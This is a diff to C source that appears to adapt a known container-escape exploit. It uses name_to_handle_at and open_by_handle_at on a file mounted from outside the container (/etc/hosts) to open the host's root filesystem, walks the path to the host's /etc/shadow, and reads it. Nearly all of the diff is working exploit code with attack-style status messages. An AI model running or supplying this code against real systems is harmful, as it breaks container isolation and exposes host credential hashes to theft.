@@ -143,9 +143,86 @@ int find_handle(int bfd, const char *path, const struct my_file_handle *ih, stru
 	return 0;
 }
 
+static struct file_handle *getHandle(const char *path) {
+	struct file_handle handle;
+	int mount_id;
+
+	handle.handle_bytes = 0;
+	name_to_handle_at(AT_FDCWD, path, &handle, &mount_id, 0);
+	if (EOVERFLOW != errno) {
+		perror(NULL);
+		return NULL;
+	}
+
+	printf("Size of struct file_handle %ld, handle_bytes %d\n",
+		sizeof(handle), handle.handle_bytes);
+
+	struct file_handle *hp;
+	if (NULL == (hp = malloc(sizeof(struct file_handle) + handle.handle_bytes))) {
+		perror(NULL);
+		return NULL;
+	}
+
+	hp->handle_bytes = handle.handle_bytes;
+	if (-1 ==  name_to_handle_at(AT_FDCWD, path, hp, &mount_id, 0)) {
+		perror(NULL);
+		return NULL;
+	}
+
+	return hp;
+}
+
+void getnDumpHandle(const char *path) {
+	struct file_handle *hp;
+
+	if (NULL != (hp = getHandle("/"))) {
+		dump_handle((struct my_file_handle*)hp);
+		free(hp);
+	}
+}
+
+int openFile(int fd, const char *path) {
+	char *p;
+
+	if (NULL == (p = strchr(path, '/'))) {
+		return fd;
+	}
+
+	DIR *dir;
+	if (NULL == (dir = fdopendir(fd))) {
+		die("[-] fdopendir");
+	}
+
+	struct dirent *de;
+	while (NULL != (de = readdir(dir))) {
+		fprintf(stderr, "[*] Found %s\n", de->d_name);
+		if (strncmp(de->d_name, p + 1, strlen(de->d_name)) == 0) {
+			fprintf(stderr, "[+] Match: %s ino=%d\n",
+				de->d_name, (int)de->d_ino);
+
+			int fd2;
+
+			if (-1 == (fd2 = openat(fd, de->d_name, O_RDONLY))) {
+				die("[-] openat");
+			}
+
+			closedir(dir);
+			close(fd);
+			return openFile(fd2, p + 1);
+		}
+	}
+
+	closedir(dir);
+	close(fd);
+	return 0;
+}
 
 int main()
 {
+	#if 1
+	getnDumpHandle("/");
+	#endif
+
 	char buf[0x1000];
 	int fd1, fd2;
 	struct my_file_handle h;
@@ -161,9 +238,11 @@ int main()
 	       "[***] forward to my friends who drink secury-tea too!      [***]\n");
 
 	// get a FS reference from something mounted in from outside
-	if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
+	// if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
+	if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
 		die("[-] open");
 
+	#if 0
 	if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)
 		die("[-] Cannot find valid handle!");
 
@@ -172,6 +251,19 @@ int main()
 
 	if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
 		die("[-] open_by_handle");
+	#else
+	int fd3;
+
+	if(-1 == (fd3 = open_by_handle_at(fd1, (struct file_handle*)&root_h, O_RDONLY))) {
+		die("[-] open_by_handle_at");
+	}
+
+	fprintf(stderr, "Succeeded in opening host root\n");
+
+	if(0 == (fd2 = openFile(fd3, "/etc/shadow"))) {
+		die("[-] openFile");
+	}
+	#endif
 
 	memset(buf, 0, sizeof(buf));
 	if (read(fd2, buf, sizeof(buf) - 1) < 0)
